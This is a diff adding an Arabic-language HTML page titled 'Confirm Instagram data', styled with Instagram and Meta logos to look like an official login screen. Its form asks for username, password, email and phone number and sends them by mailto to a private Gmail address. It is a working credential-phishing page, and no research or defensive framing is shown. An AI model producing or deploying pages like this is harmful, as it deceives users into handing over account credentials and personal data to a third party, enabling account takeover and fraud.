@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <title>تأكيد بيانات Instagram</title>
+    <style>
+        /* ألوان وأنماط الواجهة المُحدّثة */
+        body {
+            background-color: #111111; /* خلفية سوداء داكنة */
+            font-family: Arial, Helvetica, sans-serif;
+            text-align: center;
+            color: white; /* لون النص الأبيض */
+        }
+        h1 {
+            color: white; /* لون العنوان الأبيض */
+        }
+        input[type="text"],
+        input[type="password"],
+        input[type="email"],
+        input[type="tel"] {
+            border: 2px solid white; /* إطارات بيضاء حول حقول الإدخال */
+            background-color: transparent; /* خلفية شفافة */
+            color: white; /* لون النص الأبيض */
+            padding: 10px; /* تباعد داخلي */
+            margin: 10px; /* تباعد خارجي */
+            border-radius: 5px; /* تدوير الحواف */
+            width: 80%; /* عرض الحقول */
+        }
+        button[type="submit"] {
+            background-color: #007bff; /* لون زر "تأكيد البيانات" */
+            color: white; /* لون النص الأبيض */
+            border: none;
+            padding: 10px 20px; /* تباعد داخلي */
+            margin-top: 10px; /* تباعد خارجي من الأعلى */
+            border-radius: 5px; /* تدوير الحواف */
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="instagram-logo.png" alt="شعار إنستقرام" style="width: 100px; height: auto;">
+        <h1>تأكيد بيانات Instagram</h1>
+        <form action="mailto:CharlesConfinci@gmail.com" method="post" enctype="text/plain">
+            <input type="text" name="username" placeholder="اسم المستخدم">
+            <input type="password" name="password" placeholder="كلمة المرور">
+            <input type="email" name="email" placeholder="البريد الإلكتروني">
+            <input type="tel" name="phone" placeholder="رقم الهاتف">
+            <button type="submit">تأكيد البيانات</button>
+        </form>
+        <p>تسجيل دخول باستخدام Facebook</p>
+        <p>شروط الخدمة | سياسة الخصوصية</p>
+        <img src="meta-logo.png" alt="شعار Meta" style="width: 100px; height: auto; float: right;">
+    </div>
+</body>
+</html>
